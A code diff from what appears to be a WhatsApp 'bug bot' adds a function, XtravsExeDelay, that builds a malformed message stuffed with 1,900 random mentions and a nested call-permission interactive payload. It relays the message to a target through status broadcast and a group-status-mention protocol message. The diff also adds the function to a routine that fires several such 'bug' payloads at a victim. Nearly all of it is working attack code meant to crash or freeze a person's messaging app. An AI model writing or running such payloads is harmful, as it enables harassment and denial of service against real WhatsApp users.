@@ -2323,6 +2323,93 @@ async function XtravsBetaXx(target, mention) {
   }
 }
 
+let AllMentioned = [];
+AllMentioned.push(
+  Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
+  ),
+);
+
+async function XtravsExeDelay(target, mention) {
+  let message1 = {
+    extendedTextMessage: {
+      text: "𝗧𝗿⃭𝗮⃬𝗰𝗲𝗹𝗲⃭𝘀⃬𝘀 𝗞𝗶⃭𝗹𝗹⃬𝗲𝗿 𝗩⃭𝘃⃬𝗶𝗽",
+      contextInfo: {
+        participant: target,
+        mentionedJid: AllMentioned,
+        quotedMessage: {
+          viewOnceMessage: {
+            message: {
+              interactiveResponseMessage: {
+                body: {
+                  text: "",
+                  format: "DEFAULT",
+                },
+                nativeFlowResponseMessage: {
+                  name: "call_permission_request",
+                  paramsJson: "\×10",
+                  version: 3,
+                },
+              },
+            },
+          },
+        },
+      },
+    },
+  };
+  
+  const msg = generateWAMessageFromContent(target, message1, {});
+
+  await sock.relayMessage("status@broadcast", msg.message, {
+    messageId: msg.key.id,
+    statusJidList: [target],
+    additionalNodes: [
+      {
+        tag: "meta",
+        attrs: {},
+        content: [
+          {
+            tag: "mentioned_users",
+            attrs: {},
+            content: [
+              {
+                tag: "to",
+                attrs: { jid: target },
+                content: undefined,
+              },
+            ],
+          },
+        ],
+      },
+    ],
+  });
+  
+  if (mention) {
+    await sock.relayMessage(
+      target, 
+      {
+        groupStatusMentionMessage: {
+          message: {
+            protocolMessage: {
+              key: msg.key,
+              type: 25
+            }
+          }
+        }
+      }, 
+      {
+        additionalNodes: [
+          {
+            tag: "meta",
+            attrs: {
+              is_status_mention: " null - exexute "
+            },
+            content: undefined
+          }
+        ]
+      }
+    );
+  }
+}
 
 async function Delayinvisdrayy(target) {
 for (let i = 0; i < 1; i++) {
@@ -2330,9 +2417,9 @@ await BulldozerXV2(target, false)
 await DelayPayNew(target)
 await BetaHardDelay(sock, target)
 await XNecroProtocol11(target, false)
-await BulldoHard(Mvaa, target)
 await XtravsBetaXxV2(target, false)
 await XtravsBetaXx(target, false)
+await XtravsExeDelay(target, false)
 await sleep(500);
 console.log(chalk.green(`[  ☇ 𝐃𝐫𝐲𝐳𝐱 ˚𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫 𝐒𝐞𝐧𝐝 𝟔 𝐁𝐮𝐠  ]`));
     }
